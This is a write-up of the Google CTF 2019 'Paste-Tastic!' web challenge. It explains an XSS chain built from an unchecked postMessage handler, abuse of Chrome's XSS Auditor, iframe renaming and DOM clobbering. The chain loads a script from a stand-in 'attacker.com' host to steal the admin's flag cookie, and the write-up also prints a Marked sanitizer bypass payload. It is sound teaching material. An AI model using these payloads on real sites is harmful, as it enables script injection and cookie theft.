# Google CTF 2019 Quals: Paste-Tastic! (web) writeup

This was one of the 4 web challenges on the CTF, but this was the only web one which had **0 solves** when the clock hit at the end of the CTF.

I've just **missed the deadline** of solving the challenge **by ~30 minutes**.

(This would've meant **3rd** place with the +500pts, and my teammate almost finished an another challenge, so even 1st place would've been possible. We finished 7th in the end.)

So in overall I liked this challenge the most on GCTF (from those I worked with), and although we ([!SpamAndHex](https://twitter.com/spamandhex))  qualified to the Finals (the third time actually :P) which made me super happy, still I finished the CTF with a bittersweet feeling of not finishing this challenge on time...

I'd like to thank the Google guys these **nice challenges** and the **superb CTF** (Quals + Finals too), definitely one of (if not) the best CTFs in the year!

## The challenge

The description of the challenge wasn't too talkative:

```
The pretty paste solution!
https://pastetastic.web.ctfcompetition.com/
```
The website had basically 3 important functionality:

* create a paste
* view a paste
* report a paste to the admin

From the "report something to the admin" functionality it was clear that our goal is to achieve XSS on the website. It used Recaptcha protection for the submission.

You could also select your paste's language from a _long_ list of 91 languages and depending your choice your paste was rendered with

* [Marked.js](https://marked.js.org), a Markdown-to-HTML converter, if you chose Markdown
* [Prism](https://prismjs.com/), a code syntax highlighter if you chose something from the other 90 options

The app's client-side functionality was implemented in the [app.js](https://pastetastic.web.ctfcompetition.com/static/app.js) file.

(The app also remembered your recent 10 pastes and stored them in local storage, but that functionality does not matter for the challenge.)

### The plugin loader / dependency system

The app loaded only the necessary plugins depending on what type of paste you created.

For example this was used if your paste was a Markdown file:

```javascript
CONFIG={
  "viewer": [{
    "dependencies": [{
        "src":"https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/components/prism-core.min.js",
        "integrity":"sha256-sSTatLHEEY8GQrdYAuhkqrYogKZ/jDlgfYaqK3ld/uQ="
      }, {
        "src":"https://cdnjs.cloudflare.com/ajax/libs/marked/0.6.1/marked.min.js",
        "integrity":"sha256-Y0YX22e5n0zVSAd1tJ6aypkv9o4AEX5YcRKPg1Al8jg=" } ],
    "plugins": {
      "markdown": {
        "src":"https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/components/prism-markdown.min.js",
        "integrity":"sha256-e4izlzFmEQlenZQnzkYK5oyxV5mX6lwVQjL6onkHiy0=",
        "requires": ["markup"] },
      "markup": {
        "src":"https://cdnjs.cloudflare.com/ajax/libs/prism/1.16.0/components/prism-markup.min.js",
        "integrity":"sha256-8nT1E50WC5TDeb3+USsFEXN5ZGgLdmwZ6RS5KT71Wjs=" } },
    "preload": ["markdown"] }]};
```

### The renderer sandbox (iframe)

If you viewed a paste, then the app rendered the content client-side (and not server-side) with Prism or Marked.js, but the rendered content was put into a sandboxed iframe, and _not_ directly into the website's content:

```javascript
    this.sandbox = document.createElement('iframe');
    this.sandbox.setAttribute('src', '/sandbox');
    this.sandbox.setAttribute('sandbox', 'allow-same-origin');
    this.sandbox.setAttribute('class', 'sandbox');
```

The [`sandbox` attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox) limited what this `iframe` can do: for example it did _NOT_ allow to run scripts inside the `iframe` (as `allow-scripts` attribute was missing). 

The `allow-same-origin` attribute was required, so the website could modify its contents, resize it, scroll into it, etc.

The sandbox iframe and the website communicated via [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) mechanism.

### The Content-Security-Policy (CSP)

The website was also protected by the following [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP):

```
script-src 'nonce-3ra+TpXGQImBZW8NNdCJ2A==' 'unsafe-eval' 'strict-dynamic' https: http:; base-uri 'none'; object-src 'none'
```

This means the following:

* `script-src`
  * `'nonce-3ra+TpXGQImBZW8NNdCJ2A=='`: inline scripts can only run if they have a `nonce` attribute with the value `3ra+TpXGQImBZW8NNdCJ2A==`
    * this is how the `CONFIG` variable was set via `<script nonce="3ra...">CONFIG=...</script>`
    * (note: the exact value changed with every page load, so was not predictable by the attacker)
  * `'unsafe-eval'`: `eval` could be called and `eval` was actually used by `app.js` to load dependency scripts
  * `'strict-dynamic'`: if an otherwise trusted script loads another script then trust shell be propagated to that script too
  * `https: http:`: scripts could be loaded from HTTP and HTTPS sources
* `base-uri 'none'`: you could not set base URL via the `<base>` element (does not really matter for us)
* `object-src 'none'`: you could not load content via the `<object>`, `<embed>` and `<applet>` elements (does not really matter for us)

## The solution

Let's go through the building blocks required to solve this challenge.

### Some initial observations

* There were no (known) vulnerability in the third-party libraries ([Prism](https://prismjs.com/) and [Marked.js](https://marked.js.org))
  * *edit:* turns out Marked's sanitizer can be bypassed with e.g. `<script><im<script>g onerror=alert(1) />` as this will be rendered as `<img onerror=alert(1) />` (seen in [@LiveOverflow's video](https://youtu.be/zjriIehgAec?t=1288))
  * I've [sent a PR to Marked](https://github.com/markedjs/marked/pull/1504) which deprecates the sanitize argument and recommends using an external sanitizer library, e.g. DOMPurify. Also tries to fix the current bypass (while accepting the fact that other bypasses probably still exist).
* The admin visited any reported URL, not just the posts on Pastetastic
  * you had to modify the "DMCA" report's HTTP request after the Recaptcha check
* The [Marked library](https://github.com/markedjs/marked/blob/master/lib/marked.js) used for rendering Markdown is able to include `<img>` tag with `src` attribute and adds `id` attribute to heading tags (eg. to `#` -> `h1`)
  * `# ![someName](URL)` will be converted to `<h1 id="someName"><img src="URL" ...></h1>`
  * [here is the code](https://github.com/markedjs/marked/blob/0b7fc5e3420832efc1c8892d9792363a85d199a5/lib/marked.js#L973) which calculates the `id` value (requires `headerIds` to be set to `true`, but this is the default config)

### Vulnerability: there is no origin check for one of the postMessage handling code

* The website's `postMessage` handling code (`app.js:13`) did not check the `origin` and could be called by untrusted parties (us :P)

### Abusing Chrome's XSS Auditor

* `CONFIG` JS variable can be removed by abusing Chrome's XSS auditor via sending `<script ...>CONFIG=...</script>` as query parameter (e.g. `?PlzRemoveThisCodeForMe=<script>...`)
  * this is possible since Chrome 74 as it switched to `filter` mode by default instead of previous `block`
    * `filter` = removes code, `block` = does not load the website at all
    * admin used Headless Chrome 77
    * more info in this Twitter thread: https://twitter.com/shhnjk/status/1121138947923406848
  * node is removed even if the `nonce` attribute does not match, don't exactly know if it is intentional or not...

### Abusing cross-origin frame manipulation

* `CONFIG` variable can be reintroduced by iframeing the website and modifying the `name` of one of its internal iframes 
  * there is no `X-Frame-Options: DENY` header and no `frame-ancestors` policy in the [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), so iframeing is possible
  * to modify the `name` of the `iframe` to `CONFIG`, you first have to set the `location` of the `iframe` to a same-origin location (same-origin as `top` frame)
  * `iframes` are available on `window` as properties by their name and `window` properties are visible the same way as global JS variables - read more about [in the specs](https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set)

### Abusing the fact that Recaptcha adds (non-sandboxed) iframes into websites

* You cannot run scripts in the `sandbox` iframe (as its `sandbox` attribute does not include `allow-scripts` value), but Recaptcha also adds two iframes which do not have the `sandbox` attribute set, so they can run scripts
  * so redirect one of Recaptcha's iframe (not the `sandbox` one) and name it as `CONFIG`

### Hijacking application's code via DOM Clobbering

* By creating a fake DOM structure (via **DOM Clobbering**) with the help of the tricks described above, it is possible to hijack [app.js](https://github.com/koczkatamas/gctf19/blob/master/pastetastic/writeup_assets/app.js)'s code and make it to call `loadScripts` with our JS file (which will eval our code and **steal the flag** in the cookie)
  * `this.config = CONFIG.viewer[index];` (`app.js:24`)
    * `CONFIG` is our hijacked Recaptcha iframe pointing to our html file
    * our html file contains `<iframe name="viewer" src="https://pastetastic...com/view/..."></iframe>` which points to a Markdown file
      * this would not work if we used the `sandbox` iframe, as rendering Markdown requires JS, that's why we used one of Recaptcha's iframe
    * `CONFIG.viewer` is the Markdown viewer (`/view/`) page's window
    * `CONFIG.viewer[index]` (`index=0`) is the Markdown viewer page's first iframe (so the `sandbox` iframe) and this is where the rendered Markdown is
    * so `this.config` is our rendered Markdown's window
  * for loop on `this.config.dependencies` (`app.js:28`)
    * Markdown "`# dependencies`" was converted to `<h1 id="dependencies">...</h1>`
    * named elements are visible on the window (aka. on `this.config`) - again: [here is the specs](https://html.spec.whatwg.org/multipage/window-object.html#document-tree-child-browsing-context-name-property-set)
    * so `this.config.dependencies` is our `<h1>` tag (in JS it's a `[object HTMLHeadingElement]`)
    * `this.config.dependencies.length` is `undefined` as `HTMLHeadingElement` does not have a `length` property
      * we had to put `dependencies` into Markdown, because otherwise this code would've break and stop the script from running (as if `dependencies` was `undefined` then `dependencies.length` would cause a "cannot access a property of undefined" error)
    * `i < this.config.dependencies.length` is `false` as `0 < undefined == false` in JS
    * so the for loop never runs
  * for loop on `this.config.preload` (`app.js:33`)
    * same as before for `dependencies`
  * `this.loadPlugin(evt.data.lang)` (`app.js:16`)
    * `evt.data.lang` can be anything and is fully controlled by us via `postMessage` call
  * `const spec = this.config.plugins[lang];` (`app.js:53`)
    * Markdown "`# ![plugins](https://attacker.com/expl.js)`" was converted to `<h1 id="plugins"><img src="https://attacker.com/expl.js" ...></h1>`
    * `this.config.plugins` is the `<h1>` tag
    * set `lang` to `firstElementChild`
    * `this.config.plugins[lang]` is `h1`'s `firstElementChild`, so the `<img>` tag
    * `spec.requires` (`app.js:54`) is `undefined` as `HTMLImageElement` does not have an `requires` property, so this `if` is ignored
  * `this.loadScript(spec);` (`app.js:59`)
    * so `spec` is the `<img>` tag (`HTMLImageElement`)
    * `spec.integrity` (`app.js:68`) is `undefined` as `HTMLImageElement` does not have an `integrity` property, so this `if` is ignored
    * `fetch(spec.src, params)` (`app.js:71`) fetches the `<img>` tag's `src` attribute which is our exploit's URL
      * CORS should be considered, so the JS file should be served with the following headers:
        * `Access-Control-Allow-Origin: *`
        * `Access-Control-Allow-Methods: GET`

### You needed to use HTTPS to access to flag

* Flag in admin's browser was only available via HTTPS (`secure` flag in set on cookie)
  * so use HTTPS website for each step, not to run into mixed content errors

## The flag

`CTF{694435c0074e860b24cad51f584d0d30}`

TADA! ;)
